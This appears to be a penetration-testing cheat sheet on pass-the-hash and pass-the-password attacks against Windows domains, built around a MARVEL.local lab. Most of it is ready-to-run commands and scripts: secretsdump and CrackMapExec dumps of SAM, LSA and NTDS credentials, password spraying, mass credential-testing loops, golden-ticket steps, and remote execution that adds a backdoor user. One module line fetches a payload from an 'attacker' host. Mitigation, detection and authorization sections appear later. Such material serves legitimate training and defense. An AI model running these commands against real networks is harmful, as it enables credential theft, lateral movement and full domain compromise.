# Pass Attacks (Pass the Hash / Pass the Password)

## Overview
Pass attacks leverage compromised credentials (passwords or NTLM hashes) for lateral movement in Windows networks. Once you crack a password or dump SAM hashes, you can use these credentials to authenticate to other systems without needing to crack the hash.

## What are Pass Attacks?
- **Pass the Password**: Using cracked plaintext passwords to authenticate to other systems
- **Pass the Hash**: Using NTLM hashes directly for authentication without cracking them
- **Lateral Movement**: Moving from one compromised system to others using valid credentials
- **Credential Reuse**: Exploiting the fact that users often reuse passwords across systems

## secretsdump.py - Credential Extraction Master

### Overview
secretsdump.py is part of the Impacket suite and is used to extract credentials from Windows systems. It can dump SAM, LSA secrets, and NTDS.dit files both locally and remotely.

### Installation
```bash
# Install Impacket
pip3 install impacket

# Or install from source
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .

# Verify installation
secretsdump.py -h
```

### Basic Usage

#### Remote Credential Dumping
```bash
# Basic syntax
secretsdump.py DOMAIN/username:password@target_ip

# Example with domain credentials
secretsdump.py MARVEL.local/fcastle:Password1@10.0.0.25

# Local authentication (non-domain)
secretsdump.py administrator:password@10.0.0.25

# Using NTLM hash instead of password
secretsdump.py -hashes :ntlm_hash DOMAIN/username@target_ip
secretsdump.py -hashes :5fbc3d5fec8206a30f4b6c473d68ae76 MARVEL.local/administrator@10.0.0.25
```

#### Local File Analysis
```bash
# Analyze local SAM file
secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL

# Analyze NTDS.dit file
secretsdump.py -ntds ntds.dit -system system.hive LOCAL

# With additional hives
secretsdump.py -sam sam.hive -security security.hive -system system.hive -ntds ntds.dit LOCAL
```

### Advanced Options

#### Output Control
```bash
# Save output to file
secretsdump.py DOMAIN/user:pass@target -outputfile credentials

# Just NTLM hashes
secretsdump.py DOMAIN/user:pass@target -just-dc-ntlm

# Just user data (no machine accounts)
secretsdump.py DOMAIN/user:pass@target -just-dc-user

# Include password history
secretsdump.py DOMAIN/user:pass@target -history

# Show password last set date
secretsdump.py DOMAIN/user:pass@target -pwd-last-set
```

#### Specific Credential Types
```bash
# Only SAM database
secretsdump.py DOMAIN/user:pass@target -sam

# Only LSA secrets
secretsdump.py DOMAIN/user:pass@target -lsa

# Only NTDS (Domain Controller)
secretsdump.py DOMAIN/user:pass@target -ntds

# All credential types
secretsdump.py DOMAIN/user:pass@target -all
```

#### Domain Controller Specific
```bash
# Extract from specific DC
secretsdump.py DOMAIN/user:pass@dc01.domain.local

# Use different extraction method
secretsdump.py DOMAIN/user:pass@target -use-vss

# Resume interrupted dump
secretsdump.py DOMAIN/user:pass@target -resumefile resume.txt

# Specify target system
secretsdump.py DOMAIN/user:pass@target -target-system dc01.domain.local
```

### Practical Examples

#### Scenario 1: Workstation Credential Dump
```bash
# Compromised workstation with local admin
secretsdump.py administrator:Password123@192.168.1.10

# Expected output:
# [*] Service RemoteRegistry is in stopped state
# [*] Starting service RemoteRegistry
# [*] Target system bootKey: 0x5c1e984781ca0757d8d0827d788bcf1
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

#### Scenario 2: Domain Controller NTDS Dump
```bash
# Domain admin credentials
secretsdump.py MARVEL.local/administrator:Password1@192.168.1.225

# Output includes all domain accounts:
# [*] Dumping Domain Credentials (domain\username:rid:lmhash:nthash)
# MARVEL.LOCAL\Administrator:500:aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76:::
# MARVEL.LOCAL\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# MARVEL.LOCAL\fcastle:1001:aad3b435b51404eeaad3b435b51404ee:e6f48c2526bd594441d3da372155f6f:::
# MARVEL.LOCAL\tstark:1002:aad3b435b51404eeaad3b435b51404ee:c88e4ceb4c20c2bd024ce0cf4bd01530:::
```

#### Scenario 3: Pass the Hash with secretsdump
```bash
# Using previously dumped hash
secretsdump.py -hashes :5fbc3d5fec8206a30f4b6c473d68ae76 administrator@192.168.1.25

# Domain hash usage
secretsdump.py -hashes :e6f48c2526bd594441d3da372155f6f MARVEL.local/fcastle@192.168.1.225
```

### Understanding Output Formats

#### SAM Hash Format
```bash
# Format: username:rid:lmhash:nthash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76:::

# Breakdown:
# - Administrator: Username
# - 500: Relative ID (RID)
# - aad3b435b51404eeaad3b435b51404ee: LM hash (usually empty/disabled)
# - 5fbc3d5fec8206a30f4b6c473d68ae76: NTLM hash (what we use for pass-the-hash)
```

#### Domain Credentials Format
```bash
# Format: DOMAIN\username:rid:lmhash:nthash
MARVEL.LOCAL\fcastle:1001:aad3b435b51404eeaad3b435b51404ee:e6f48c2526bd594441d3da372155f6f:::

# Machine accounts (end with $)
MARVEL.LOCAL\SPIDERMAN$:1103:aad3b435b51404eeaad3b435b51404ee:hash:::
```

#### Cached Credentials
```bash
# DCC2 format (domain cached credentials)
MARVEL.LOCAL/tstark:$DCC2$10240#tstark#c88e4ceb4c20c2bd024ce0cf4bd01530

# Format breakdown:
# - $DCC2$: Indicates cached credential type
# - 10240: Iteration count
# - tstark: Username
# - hash: The actual cached hash
```

### Integration with Other Tools

#### Using Dumped Hashes with CrackMapExec
```bash
# After secretsdump, use hashes with CME
secretsdump.py DOMAIN/user:pass@target -outputfile domain_hashes

# Extract NTLM hashes and use with CME
crackmapexec smb 192.168.1.0/24 -u administrator -H 5fbc3d5fec8206a30f4b6c473d68ae76
```

#### Hash Cracking with Hashcat
```bash
# Extract NTLM hashes for cracking
grep -E ":[0-9]+:aad3b435b51404eeaad3b435b51404ee:" secretsdump_output.txt | cut -d: -f4 > ntlm_hashes.txt

# Crack with hashcat
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

# Crack DCC2 hashes
hashcat -m 2100 dcc2_hashes.txt rockyou.txt
```

#### Golden Ticket Creation
```bash
# Extract krbtgt hash from NTDS dump
grep krbtgt secretsdump_output.txt

# Use with ticketer.py for golden ticket
ticketer.py -nthash krbtgt_hash -domain-sid domain_sid -domain domain.local administrator
```

### Advanced Techniques

#### VSS (Volume Shadow Service) Method
```bash
# Use Volume Shadow Copy for extraction
secretsdump.py DOMAIN/user:pass@target -use-vss

# Benefits:
# - Can extract from locked files
# - Less likely to be detected
# - Works even if services are running
```

#### Kerberos Authentication
```bash
# Use Kerberos ticket instead of password
export KRB5CCNAME=/tmp/krb5cc_0
secretsdump.py -k -no-pass DOMAIN/user@target.domain.local

# With specific ticket cache
secretsdump.py -k -no-pass -dc-ip dc_ip DOMAIN/user@target
```

#### LDAP Integration
```bash
# Specify LDAP server
secretsdump.py DOMAIN/user:pass@target -ldap-server ldap://dc.domain.local

# Use LDAPS
secretsdump.py DOMAIN/user:pass@target -ldap-server ldaps://dc.domain.local
```

### Defensive Considerations

#### Detection Indicators
```bash
# Windows Event Logs to monitor:
# - Event ID 4624: Logon (Type 3 - Network)
# - Event ID 4648: Explicit credential logon
# - Event ID 4672: Special privileges assigned
# - Event ID 5140: Network share accessed (ADMIN$, C$)
# - Event ID 4697: Service installed (if using service method)

# Registry access patterns:
# - HKLM\SAM\SAM\Domains\Account\Users
# - HKLM\SECURITY\Policy\Secrets
# - Remote registry access to these keys
```

#### Prevention Strategies
```bash
# Implement proper access controls:
# - Restrict administrative access
# - Use LAPS for local admin passwords
# - Enable credential guard
# - Implement JEA (Just Enough Administration)
# - Monitor for suspicious registry access
# - Use Protected Users group for sensitive accounts
```

### Troubleshooting Common Issues

#### Access Denied Errors
```bash
# Ensure proper privileges
# For SAM/LSA: Local administrator required
# For NTDS: Domain administrator or backup operator required

# Check if RemoteRegistry service is running
sc query RemoteRegistry

# Start RemoteRegistry if needed
sc start RemoteRegistry
```

#### Connection Issues
```bash
# Specify target explicitly
secretsdump.py DOMAIN/user:pass@target -target-ip ip_address

# Use different authentication method
secretsdump.py -hashes :hash DOMAIN/user@target

# Check firewall/network connectivity
telnet target 445
```

#### Large Domain Optimization
```bash
# Resume interrupted dumps
secretsdump.py DOMAIN/user:pass@target -resumefile resume.txt

# Limit output to specific types
secretsdump.py DOMAIN/user:pass@target -just-dc-user

# Use specific output format
secretsdump.py DOMAIN/user:pass@target -outputfile results
```

### Automation Scripts

#### Bash Script for Multiple Targets
```bash
#!/bin/bash
# Mass secretsdump script

DOMAIN="MARVEL.local"
USERNAME="administrator"
PASSWORD="Password1"
TARGETS="targets.txt"

while read -r target; do
    echo "[+] Dumping credentials from $target"
    secretsdump.py "$DOMAIN/$USERNAME:$PASSWORD@$target" -outputfile "${target}_dump"
    sleep 2
done < "$TARGETS"
```

#### Python Integration
```python
#!/usr/bin/env python3
import subprocess
import sys
import re

def extract_ntlm_hashes(secretsdump_output):
    """Extract NTLM hashes from secretsdump output"""
    hash_pattern = r'([^:]+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::'
    hashes = []
    
    for line in secretsdump_output.split('\n'):
        match = re.search(hash_pattern, line)
        if match:
            username, rid, lm_hash, ntlm_hash = match.groups()
            if ntlm_hash != '31d6cfe0d16ae931b73c59d7e0c089c0':  # Not empty hash
                hashes.append((username, ntlm_hash))
    
    return hashes

def run_secretsdump(target, domain, username, password):
    """Run secretsdump and return output"""
    cmd = f"secretsdump.py {domain}/{username}:{password}@{target}"
    result = subprocess.run(cmd.split(), capture_output=True, text=True)
    return result.stdout

# Usage example
target = "192.168.1.10"
domain = "MARVEL.local"
username = "administrator"
password = "Password1"

output = run_secretsdump(target, domain, username, password)
hashes = extract_ntlm_hashes(output)

for user, hash_val in hashes:
    print(f"{user}:{hash_val}")
```

### Real-World Attack Chain with secretsdump

#### Phase 1: Initial Access
```bash
# 1. Gained access to workstation as local admin
# 2. Dump local SAM for additional credentials
secretsdump.py administrator:LocalPass123@192.168.1.50

# Found: user1:hash1, user2:hash2
```

#### Phase 2: Lateral Movement
```bash
# 3. Test dumped hashes on other systems
crackmapexec smb 192.168.1.0/24 -u user1 -H hash1

# 4. Found admin access to server
# 5. Dump server credentials
secretsdump.py -hashes :hash1 user1@192.168.1.100

# Found: serviceaccount:servicehash
```

#### Phase 3: Domain Compromise
```bash
# 6. Test service account across domain
crackmapexec smb 192.168.1.0/24 -u serviceaccount -H servicehash

# 7. Found DC access, dump NTDS
secretsdump.py -hashes :servicehash DOMAIN/serviceaccount@dc.domain.local

# 8. Extract krbtgt hash for golden ticket
grep krbtgt ntds_dump.txt
```

## Pass Attack Mitigations

### Overview
While pass attacks are hard to completely prevent, organizations can implement several strategies to make them significantly more difficult for attackers to execute successfully.

### Limit Account Re-use

#### Avoid Re-using Local Admin Passwords
```bash
# Problem: Same local admin password across multiple systems
# Solution: Use unique passwords for each system

# Implement LAPS (Local Administrator Password Solution)
# - Automatically generates unique passwords for each computer
# - Stores passwords in Active Directory
# - Regularly rotates passwords
# - Provides secure password retrieval for authorized users
```

#### Disable Default Accounts
```bash
# Disable Guest account
net user guest /active:no

# Disable built-in Administrator account (if not needed)
net user administrator /active:no

# Create custom administrative accounts instead
net user customadmin Password123! /add
net localgroup administrators customadmin /add
```

#### Implement Least Privilege
```bash
# Limit who has local administrator rights
# Use principle of least privilege
# Regular audit of administrative group memberships

# PowerShell to audit local admins
Get-LocalGroupMember -Group "Administrators"

# Domain-wide admin audit
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Enterprise Admins"
```

### Utilize Strong Passwords

#### Password Length Requirements
```bash
# Implement minimum 14+ character passwords
# The longer the better for hash cracking resistance

# Group Policy settings:
# Computer Configuration > Windows Settings > Security Settings > Account Policies > Password Policy
# - Minimum password length: 14 characters
# - Password must meet complexity requirements: Enabled
# - Maximum password age: 60-90 days
```

#### Avoid Common Words
```bash
# Banned password list implementation
# Avoid dictionary words, company names, common patterns
# Use passphrases instead of passwords

# Examples of strong passwords:
# - MyC0mp@nyH@sStr0ngP@ssw0rds!2024
# - ILoveEating$Pizza&Burgers123
# - Coffee+Morning=ProductiveDay2024!
```

#### Passphrase Implementation
```bash
# Encourage long sentences/passphrases
# Easier to remember, harder to crack
# Examples:
# - "I drink 3 cups of coffee every morning!"
# - "My favorite movie is Star Wars Episode 4"
# - "Security training happens every Tuesday at 2PM"
```

### Privilege Access Management (PAM)

#### Check Out/In Sensitive Accounts
```bash
# Implement PAM solutions like:
# - CyberArk
# - BeyondTrust
# - Thycotic Secret Server

# Benefits:
# - Passwords are checked out when needed
# - Automatic password rotation after use
# - Full session recording and monitoring
# - Approval workflows for access
```

#### Automatic Password Rotation
```bash
# Rotate passwords on check out and check in
# Prevents credential reuse after access
# Limits window of opportunity for attackers

# Implementation example:
# 1. User requests access to server
# 2. PAM generates new password
# 3. User gets temporary access
# 4. Password is rotated again after session ends
```

#### Session Monitoring
```bash
# Monitor and record privileged sessions
# Alert on suspicious activities
# Maintain audit trails for compliance

# Key monitoring points:
# - Login times and duration
# - Commands executed
# - Files accessed
# - Network connections made
```

### Additional Mitigation Strategies

#### Network Segmentation
```bash
# Segment critical systems
# Limit lateral movement opportunities
# Implement micro-segmentation where possible

# Network design considerations:
# - Separate VLANs for different security zones
# - Firewall rules between segments
# - Jump boxes for administrative access
# - DMZ for internet-facing services
```

#### Multi-Factor Authentication (MFA)
```bash
# Implement MFA for all administrative accounts
# Use hardware tokens where possible
# Require MFA for remote access

# MFA options:
# - Smart cards
# - FIDO2 security keys
# - Mobile authenticator apps
# - Biometric authentication
```

#### Credential Guard and Protected Users
```bash
# Enable Windows Credential Guard
# Use Protected Users security group
# Implement LSASS protection

# Protected Users group benefits:
# - Cannot use NTLM authentication
# - Cannot use DES or RC4 in Kerberos
# - Cannot be delegated
# - Cannot use weak cryptography
```

#### Regular Security Audits
```bash
# Conduct regular password audits
# Test for weak/reused passwords
# Monitor for credential exposure

# Audit activities:
# - Password strength assessments
# - Credential reuse detection
# - Privileged account reviews
# - Access rights validation
```

### Monitoring and Detection

#### Event Log Monitoring
```bash
# Monitor for pass-the-hash indicators
# Key events to watch:

# Event ID 4624 - Successful logon
# - Look for Type 3 (Network) logons
# - Monitor for unusual logon patterns
# - Alert on administrative account usage

# Event ID 4648 - Explicit credential logon
# - Indicates use of alternate credentials
# - Common in pass-the-hash attacks

# Event ID 4672 - Special privileges assigned
# - Administrative privileges granted
# - Monitor for unexpected privilege assignments
```

#### Behavioral Analytics
```bash
# Implement User and Entity Behavior Analytics (UEBA)
# Detect unusual access patterns
# Alert on anomalous administrative activities

# Behavioral indicators:
# - Unusual login times
# - Access from unexpected locations
# - Rapid lateral movement
# - Excessive privilege usage
```

#### Honeypots and Decoys
```bash
# Deploy honeypot accounts
# Create fake high-value targets
# Monitor for unauthorized access attempts

# Honeypot strategies:
# - Fake administrative accounts
# - Decoy servers with monitoring
# - Canary tokens in documents
# - Fake service accounts
```

### Implementation Checklist

#### Immediate Actions
```bash
□ Enable LAPS for local administrator passwords
□ Disable unnecessary default accounts
□ Implement strong password policies (14+ characters)
□ Enable MFA for all administrative accounts
□ Audit current administrative group memberships
```

#### Short-term Goals (1-3 months)
```bash
□ Implement PAM solution for privileged accounts
□ Deploy credential guard on all systems
□ Set up comprehensive event log monitoring
□ Conduct password strength audit
□ Implement network segmentation
```

#### Long-term Strategy (3-12 months)
```bash
□ Deploy UEBA solution
□ Implement zero-trust network architecture
□ Regular penetration testing focused on pass attacks
□ Staff security awareness training
□ Continuous security monitoring and improvement
```

### Cost-Benefit Analysis

#### Low-Cost, High-Impact Measures
```bash
# Free or low-cost mitigations:
# - Strong password policies
# - Disabling unnecessary accounts
# - Basic event log monitoring
# - Regular administrative account audits
# - Security awareness training
```

#### Medium-Cost, High-Impact Measures
```bash
# Moderate investment mitigations:
# - LAPS implementation
# - MFA deployment
# - Basic PAM solution
# - Network segmentation
# - Enhanced monitoring tools
```

#### High-Cost, High-Impact Measures
```bash
# Significant investment mitigations:
# - Enterprise PAM solution
# - UEBA implementation
# - Zero-trust architecture
# - Advanced threat detection
# - Comprehensive security operations center
```

## CrackMapExec (CME) - The Swiss Army Knife

### Installation
```bash
# Install via pip
pip3 install crackmapexec

# Install from source
git clone https://github.com/Porchetta-Industries/CrackMapExec.git
cd CrackMapExec
python3 setup.py install

# Install via apt (Kali Linux)
sudo apt install crackmapexec
```

### Basic SMB Enumeration
```bash
# Basic network scan for SMB
crackmapexec smb 192.168.1.0/24

# Scan specific targets
crackmapexec smb 192.168.1.10-20

# Scan from file
crackmapexec smb targets.txt

# Verbose output
crackmapexec smb 192.168.1.0/24 -v
```

### Authentication Methods

#### Pass the Password
```bash
# Single target with username/password
crackmapexec smb 192.168.1.10 -u administrator -p Password123

# Multiple targets with single credential
crackmapexec smb 192.168.1.0/24 -u administrator -p Password123

# Domain authentication
crackmapexec smb 192.168.1.0/24 -u fcastle -d MARVEL.local -p Password1

# Multiple users and passwords
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt

# Password spraying (one password, multiple users)
crackmapexec smb 192.168.1.0/24 -u users.txt -p Password123

# Credential stuffing (user:pass combinations)
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce
```

#### Pass the Hash
```bash
# Using NTLM hash
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76

# Using hash from secretsdump
crackmapexec smb 192.168.1.0/24 -u administrator -H 5fbc3d5fec8206a30f4b6c473d68ae76

# Local hash (SAM dump)
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 --local-auth
```

### Advanced Authentication

#### Domain Authentication
```bash
# Domain user authentication
crackmapexec smb 192.168.1.0/24 -u 'DOMAIN\username' -p password

# Alternative domain syntax
crackmapexec smb 192.168.1.0/24 -u username -p password -d DOMAIN.local

# Domain administrator
crackmapexec smb 192.168.1.0/24 -u 'DOMAIN\Administrator' -p password
```

#### Null Sessions and Guest Access
```bash
# Null session
crackmapexec smb 192.168.1.0/24 -u '' -p ''

# Guest account
crackmapexec smb 192.168.1.0/24 -u guest -p ''

# Anonymous login
crackmapexec smb 192.168.1.0/24 -u anonymous -p anonymous
```

### Command Execution

#### Basic Command Execution
```bash
# Execute single command
crackmapexec smb 192.168.1.10 -u administrator -p password -x "whoami"

# PowerShell command
crackmapexec smb 192.168.1.10 -u administrator -p password -X "Get-Process"

# Command with domain credentials
crackmapexec smb 192.168.1.10 -u fcastle -d MARVEL.local -p Password1 -x "hostname"
```

#### Advanced Command Execution
```bash
# Execute command on multiple targets
crackmapexec smb 192.168.1.0/24 -u administrator -p password -x "whoami" --threads 50

# Save output to file
crackmapexec smb 192.168.1.0/24 -u administrator -p password -x "ipconfig" > output.txt

# Execute with hash
crackmapexec smb 192.168.1.10 -u administrator -H hash -x "net user"

# PowerShell with encoded command
crackmapexec smb 192.168.1.10 -u admin -p pass -X "powershell.exe -enc <base64_command>"
```

### Share Enumeration

#### List Shares
```bash
# List all shares
crackmapexec smb 192.168.1.10 -u administrator -p password --shares

# List shares with permissions
crackmapexec smb 192.168.1.0/24 -u user -p pass --shares

# List shares with domain credentials
crackmapexec smb 192.168.1.0/24 -u 'DOMAIN\user' -p pass --shares
```

#### Access Shares
```bash
# List files in specific share
crackmapexec smb 192.168.1.10 -u admin -p pass --spider C$ --pattern txt

# Spider all shares
crackmapexec smb 192.168.1.10 -u admin -p pass --spider-folder .

# Search for specific files
crackmapexec smb 192.168.1.10 -u admin -p pass --spider C$ --pattern "*.config"
```

### Credential Dumping

#### SAM Database
```bash
# Dump SAM hashes
crackmapexec smb 192.168.1.10 -u administrator -p password --sam

# Dump with hash authentication
crackmapexec smb 192.168.1.10 -u administrator -H hash --sam

# Dump from multiple targets
crackmapexec smb 192.168.1.0/24 -u administrator -p password --sam
```

#### LSA Secrets
```bash
# Dump LSA secrets
crackmapexec smb 192.168.1.10 -u administrator -p password --lsa

# Dump NTDS (Domain Controller)
crackmapexec smb 192.168.1.10 -u administrator -p password --ntds

# Dump with specific method
crackmapexec smb 192.168.1.10 -u admin -p pass --ntds --ntds-history --ntds-pwdLastSet
```

### Module Usage

#### Available Modules
```bash
# List all modules
crackmapexec smb --list-modules

# Get module info
crackmapexec smb -M module_name --module-info
```

#### Common Modules
```bash
# Mimikatz module
crackmapexec smb 192.168.1.10 -u admin -p pass -M mimikatz

# Token impersonation
crackmapexec smb 192.168.1.10 -u admin -p pass -M tokens

# Web delivery
crackmapexec smb 192.168.1.10 -u admin -p pass -M web_delivery -o URL=http://attacker/payload

# Empire module
crackmapexec smb 192.168.1.10 -u admin -p pass -M empire_exec -o LISTENER=test

# Persistence
crackmapexec smb 192.168.1.10 -u admin -p pass -M persistence -o METHOD=registry
```

### Practical Attack Scenarios

#### Scenario 1: Password Spraying
```bash
# Create user list
echo -e "administrator\nadmin\nuser\nservice" > users.txt

# Password spray common passwords
crackmapexec smb 192.168.1.0/24 -u users.txt -p Password123 --continue-on-success

# Try multiple common passwords
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success
```

#### Scenario 2: Lateral Movement with Cracked Password
```bash
# Found password: fcastle:Password1
# Test across network
crackmapexec smb 192.168.1.0/24 -u fcastle -d MARVEL.local -p Password1

# Execute commands on accessible systems
crackmapexec smb 192.168.1.0/24 -u fcastle -d MARVEL.local -p Password1 -x "whoami"

# Dump credentials from accessible systems
crackmapexec smb 192.168.1.0/24 -u fcastle -d MARVEL.local -p Password1 --sam
```

#### Scenario 3: Pass the Hash Attack
```bash
# Dumped hash: administrator:aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76
# Use hash for authentication
crackmapexec smb 192.168.1.0/24 -u administrator -H 5fbc3d5fec8206a30f4b6c473d68ae76

# Execute commands with hash
crackmapexec smb 192.168.1.0/24 -u administrator -H 5fbc3d5fec8206a30f4b6c473d68ae76 -x "net user hacker Password123 /add"
```

### Other Tools for Pass Attacks

#### Impacket Suite
```bash
# psexec.py - Execute commands
psexec.py DOMAIN/username:password@target_ip

# psexec with hash
psexec.py -hashes :ntlm_hash DOMAIN/username@target_ip

# wmiexec.py - WMI execution
wmiexec.py DOMAIN/username:password@target_ip

# smbexec.py - SMB execution
smbexec.py DOMAIN/username:password@target_ip

# secretsdump.py - Dump credentials
secretsdump.py DOMAIN/username:password@target_ip
```

#### Evil-WinRM
```bash
# WinRM with password
evil-winrm -i target_ip -u username -p password

# WinRM with hash
evil-winrm -i target_ip -u username -H hash

# WinRM with SSL
evil-winrm -i target_ip -u username -p password -S
```

#### Metasploit
```bash
# psexec module
use exploit/windows/smb/psexec
set RHOSTS target_ip
set SMBUser username
set SMBPass password
exploit

# Pass the hash module
use exploit/windows/smb/psexec
set RHOSTS target_ip
set SMBUser username
set SMBPass aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76
exploit
```

### Defense and Detection

#### Detection Indicators
```bash
# Windows Event Logs to monitor:
# - Event ID 4624: Successful logon (Type 3 - Network)
# - Event ID 4625: Failed logon attempt
# - Event ID 4648: Explicit credential logon
# - Event ID 4672: Special privileges assigned
# - Event ID 5140: Network share accessed
```

#### Defensive Measures
```bash
# Enable SMB signing
# Disable NTLM authentication where possible
# Implement LAPS for local admin passwords
# Use Protected Users group
# Monitor for lateral movement patterns
# Implement network segmentation
```

### Advanced Techniques

#### Kerberos Authentication
```bash
# Use Kerberos ticket
crackmapexec smb target.domain.local --use-kcache

# Specify ticket cache
crackmapexec smb target.domain.local --use-kcache --kcache /tmp/krb5cc_0
```

#### NTLM Relay Integration
```bash
# Use with ntlmrelayx
# Terminal 1: Start ntlmrelayx
ntlmrelayx.py -tf targets.txt -c "crackmapexec smb targets.txt -u username -p password --sam"

# Terminal 2: Trigger authentication
# Use various methods to trigger NTLM authentication
```

### Scripting and Automation

#### Bash Automation
```bash
#!/bin/bash
# Mass credential testing script

TARGETS="targets.txt"
USERS="users.txt"
PASSWORDS="passwords.txt"

while read -r target; do
    echo "Testing $target"
    crackmapexec smb "$target" -u "$USERS" -p "$PASSWORDS" --continue-on-success
done < "$TARGETS"
```

#### Python Integration
```python
#!/usr/bin/env python3
import subprocess
import sys

def test_credentials(target, username, password):
    cmd = f"crackmapexec smb {target} -u {username} -p {password}"
    result = subprocess.run(cmd.split(), capture_output=True, text=True)
    
    if "Pwn3d!" in result.stdout:
        print(f"[+] Success: {username}:{password} on {target}")
        return True
    return False

# Usage
targets = ["192.168.1.10", "192.168.1.11"]
credentials = [("admin", "password"), ("user", "123456")]

for target in targets:
    for username, password in credentials:
        test_credentials(target, username, password)
```

### Common CME Flags and Options

#### Authentication Flags
```bash
-u, --username          Username
-p, --password          Password
-H, --hash              NTLM hash
-d, --domain            Domain
--local-auth            Local authentication
--continue-on-success   Continue after successful auth
```

#### Execution Flags
```bash
-x, --exec              Execute command (cmd.exe)
-X, --ps-exec           Execute PowerShell command
--no-output             Don't print command output
--codec                 Set encoding for output
```

#### Database and Logging
```bash
--verbose               Verbose output
--debug                 Debug output
--log                   Export logs to file
--export                Export credentials to file
```

### Troubleshooting Common Issues

#### Connection Issues
```bash
# SMB signing required
crackmapexec smb target --signing

# Specify SMB version
crackmapexec smb target --smb-version 1

# Timeout issues
crackmapexec smb target --timeout 10
```

#### Authentication Issues
```bash
# Check if account is locked
crackmapexec smb target -u username -p '' --check-lockout

# Test guest access
crackmapexec smb target -u guest -p ''

# Verify domain name
crackmapexec smb target -u username -p password -d DOMAIN
```

## Real-World Attack Chain Example

### Phase 1: Initial Compromise
```bash
# 1. Capture NTLM hash via responder/mitm6
# 2. Crack hash or use pass-the-hash
hashcat -m 1000 hash.txt rockyou.txt
# Result: fcastle:Password1
```

### Phase 2: Lateral Movement
```bash
# 3. Test credentials across network
crackmapexec smb 192.168.1.0/24 -u fcastle -d MARVEL.local -p Password1

# 4. Identify accessible systems
# Results show: SPIDERMAN (Pwn3d!), THEPUNISHER (Pwn3d!)
```

### Phase 3: Credential Harvesting
```bash
# 5. Dump SAM from accessible systems
crackmapexec smb 192.168.1.35 -u fcastle -d MARVEL.local -p Password1 --sam
crackmapexec smb 192.168.1.25 -u fcastle -d MARVEL.local -p Password1 --sam

# 6. Extract new credentials
# Found: administrator:aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76
```

### Phase 4: Privilege Escalation
```bash
# 7. Test admin hash across network
crackmapexec smb 192.168.1.0/24 -u administrator -H 5fbc3d5fec8206a30f4b6c473d68ae76

# 8. Access domain controller
crackmapexec smb 192.168.1.225 -u administrator -H 5fbc3d5fec8206a30f4b6c473d68ae76 --ntds
```

---

**Note**: Always ensure proper authorization before conducting pass attacks. These techniques should only be used in authorized penetration testing scenarios or controlled lab environments. 